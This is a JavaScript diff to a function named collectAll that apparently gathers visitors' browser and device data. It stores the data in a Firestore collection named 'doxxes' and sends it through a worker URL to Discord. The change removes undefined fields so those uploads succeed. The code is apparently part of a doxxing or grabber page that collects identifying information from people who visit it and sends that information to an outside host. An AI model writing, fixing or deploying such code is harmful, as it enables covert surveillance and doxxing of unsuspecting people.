@@ -389,15 +389,23 @@ async function collectAll() {
   ...uahData
  };
 
+ // FIX: Remove all undefined values to prevent Firestore errors
+ const cleanPayload = {};
+ for (const key in payload) {
+  if (payload[key] !== undefined) {
+   cleanPayload[key] = payload[key];
+  }
+ }
+
  addLine("Packaging Data...");
  
  // Send to Firebase
  if (FB_READY) {
   try {
    await addDoc(collection(db, "doxxes"), {
-    ...payload,
+    ...cleanPayload, // Use cleanPayload instead of payload
     timestamp: serverTimestamp(),
-    userAgent: payload.userAgent
+    userAgent: cleanPayload.userAgent
    });
    addLine("✅ Saved to Firestore");
   } catch (e) {
@@ -411,7 +419,7 @@ async function collectAll() {
    await fetch(WORKER_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
+    body: JSON.stringify(cleanPayload) // Also send clean data to Worker
    });
    addLine("✅ Sent to Discord");
   } catch (e) {
